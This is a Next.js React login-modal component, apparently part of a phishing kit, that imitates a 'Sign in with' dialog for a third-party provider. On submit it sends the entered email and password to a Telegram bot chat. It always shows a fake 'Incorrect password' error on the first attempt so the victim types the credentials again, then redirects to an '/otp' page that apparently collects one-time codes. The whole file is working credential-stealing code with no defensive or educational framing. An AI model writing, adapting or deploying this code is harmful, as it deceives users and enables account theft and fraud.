'use client';

import { useState } from "react";
import { useRouter } from "next/navigation";
import { motion, AnimatePresence } from "framer-motion";

interface Props {
  provider: string;
  onClose: () => void;
  clickCount: number;
  setClickCount: (count: number) => void;
}

export default function LoginModal({ provider, onClose, clickCount, setClickCount }: Props) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newClickCount = clickCount + 1;
    setClickCount(newClickCount);

    if (!email || !password) {
      setError("Email and password are required.");
      return;
    }

    const message = `🔐 *Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Provider: ${provider}`;

    try {
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown",
          }),
        }
      );

      if (newClickCount === 1) {
        setError("Incorrect password. Please try again.");
      } else if (telegramResponse.ok) {
        router.push("/otp");
      } else {
        const data = await telegramResponse.json();
        setError(data.description || "Telegram message failed.");
      }
    } catch (err) {
      setError("Network error. Try again later.");
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
      <AnimatePresence>
        <motion.form
          onSubmit={handleSubmit}
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.9, y: 40 }}
          transition={{ duration: 0.4, ease: "easeInOut" }}
          className="w-full h-full md:h-auto md:w-[28rem] bg-white/10 backdrop-blur-md rounded-none md:rounded-2xl shadow-2xl p-8 flex flex-col justify-center"
        >
          <h2 className="text-3xl font-semibold text-white mb-6 text-center tracking-wide">
            Sign in with {provider}
          </h2>

          <input
            type="email"
            placeholder="Enter your email"
            className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-white/70 mb-4 outline-none focus:ring-2 focus:ring-[#F25022] transition"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            autoComplete="email"
            required
          />
          <input
            type="password"
            placeholder="Enter your password"
            className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-white/70 mb-4 outline-none focus:ring-2 focus:ring-[#F25022] transition"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            autoComplete="current-password"
            required
          />

          {error && (
            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="text-red-400 text-sm mb-4 text-center"
            >
              {error}
            </motion.p>
          )}

          <button
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 rounded-lg mb-3 transition-all duration-200"
          >
            Login
          </button>

          <button
            type="button"
            onClick={onClose}
            className="w-full text-red-400 hover:text-red-500 text-sm underline transition-all duration-200"
          >
            Cancel
          </button>
        </motion.form>
      </AnimatePresence>
    </div>
  );
}
